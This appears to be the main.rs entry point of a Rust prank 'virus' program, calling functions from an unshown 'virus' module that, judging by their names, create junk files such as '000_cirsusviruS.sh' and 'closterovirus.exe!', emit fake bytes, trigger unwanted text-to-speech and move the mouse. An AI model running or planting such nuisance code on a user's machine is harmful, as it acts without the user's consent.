use crate::virus::sine_mouse_wave;
use crate::virus::Clov;

mod virus;

fn main() {
    Clov::command("touch", "000_cirsusviruS.sh");
    Clov::fake_bytes();
    Clov::unwanted_tts();
    Clov::create_files("closterovirus.exe!");
    Clov::call_df();
}
